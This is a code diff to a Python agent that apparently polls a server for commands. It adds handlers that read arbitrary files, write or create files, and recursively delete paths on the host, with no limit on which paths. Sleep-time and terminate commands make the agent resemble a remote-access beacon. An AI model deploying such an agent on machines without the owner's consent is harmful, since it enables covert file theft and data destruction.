@@ -2,6 +2,8 @@ import requests as rq
 from sys import argv
 import time
 import os
+import json
+import shutil
 from pathlib import Path
 import subprocess
 
@@ -275,6 +277,165 @@ def execute_set_sleep_time_command(command_data):
         return {'status': 'error', 'error': str(e)}
 
 
+def execute_read_file_command(command_data):
+    """Read file content for editing"""
+    try:
+        file_path = command_data.get('path', '')
+        max_size = command_data.get('max_size', 10 * 1024 * 1024)  # 10MB default
+
+        if not file_path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Check if file exists
+        if not os.path.exists(file_path):
+            return {'status': 'error', 'error': f'File not found: {file_path}'}
+
+        # Check if it's a file (not a directory)
+        if not os.path.isfile(file_path):
+            return {'status': 'error', 'error': f'Path is not a file: {file_path}'}
+
+        # Check file size
+        file_size = os.path.getsize(file_path)
+        if file_size > max_size:
+            return {
+                'status': 'error',
+                'error': f'File too large ({file_size} bytes). Maximum size: {max_size} bytes'
+            }
+
+        # Detect if binary file
+        with open(file_path, 'rb') as f:
+            chunk = f.read(1024)
+            is_binary = b'\x00' in chunk
+
+        if is_binary:
+            return {'status': 'error', 'error': 'Cannot edit binary file'}
+
+        # Try to read as text with different encodings
+        encodings = ['utf-8', 'latin-1', 'cp1252', 'utf-16']
+        content = None
+        used_encoding = None
+
+        for encoding in encodings:
+            try:
+                with open(file_path, 'r', encoding=encoding) as f:
+                    content = f.read()
+                    used_encoding = encoding
+                    break
+            except (UnicodeDecodeError, LookupError):
+                continue
+
+        if content is None:
+            return {'status': 'error', 'error': 'Could not decode file with known encodings'}
+
+        return {
+            'status': 'success',
+            'result': json.dumps({
+                'content': content,
+                'encoding': used_encoding,
+                'size': file_size
+            })
+        }
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
+def execute_write_file_command(command_data):
+    """Write/save file content"""
+    try:
+        file_path = command_data.get('path', '')
+        content = command_data.get('content', '')
+
+        if not file_path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Create backup if file exists
+        backup_path = None
+        if os.path.exists(file_path):
+            backup_path = file_path + '.backup'
+            try:
+                shutil.copy2(file_path, backup_path)
+            except Exception as e:
+                return {'status': 'error', 'error': f'Failed to create backup: {str(e)}'}
+
+        # Write file
+        try:
+            # Create parent directories if needed
+            parent_dir = os.path.dirname(file_path)
+            if parent_dir and not os.path.exists(parent_dir):
+                os.makedirs(parent_dir, exist_ok=True)
+
+            with open(file_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+
+            # Remove backup on success
+            if backup_path and os.path.exists(backup_path):
+                os.remove(backup_path)
+
+            file_size = os.path.getsize(file_path)
+            return {
+                'status': 'success',
+                'result': f'File saved: {file_path} ({file_size} bytes)'
+            }
+
+        except Exception as e:
+            # Restore backup on failure
+            if backup_path and os.path.exists(backup_path):
+                try:
+                    shutil.copy2(backup_path, file_path)
+                    os.remove(backup_path)
+                except:
+                    pass
+            raise e
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
+def execute_delete_command(command_data):
+    """Delete file or directory"""
+    try:
+        path = command_data.get('path', '')
+        recursive = command_data.get('recursive', False)
+
+        if not path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Check if path exists
+        if not os.path.exists(path):
+            return {'status': 'error', 'error': f'Path not found: {path}'}
+
+        # Delete based on type
+        if os.path.isfile(path):
+            os.remove(path)
+            return {'status': 'success', 'result': f'File deleted: {path}'}
+        elif os.path.isdir(path):
+            if recursive:
+                shutil.rmtree(path)
+                return {'status': 'success', 'result': f'Directory deleted: {path}'}
+            else:
+                # Try to delete empty directory
+                try:
+                    os.rmdir(path)
+                    return {'status': 'success', 'result': f'Directory deleted: {path}'}
+                except OSError:
+                    return {
+                        'status': 'error',
+                        'error': 'Directory not empty. Use recursive=true to delete non-empty directories'
+                    }
+        else:
+            return {'status': 'error', 'error': f'Unknown path type: {path}'}
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
 def execute_command_by_type(command):
     """Route command to appropriate handler based on type"""
     cmd_type = command.get('type', 'exec')
@@ -290,6 +451,12 @@ def execute_command_by_type(command):
         return execute_list_directory_command(cmd_data)
     elif cmd_type == 'set_sleep_time':
         return execute_set_sleep_time_command(cmd_data)
+    elif cmd_type == 'read_file':
+        return execute_read_file_command(cmd_data)
+    elif cmd_type == 'write_file':
+        return execute_write_file_command(cmd_data)
+    elif cmd_type == 'delete':
+        return execute_delete_command(cmd_data)
     elif cmd_type == 'terminate':
         return execute_terminate_command()
     else:
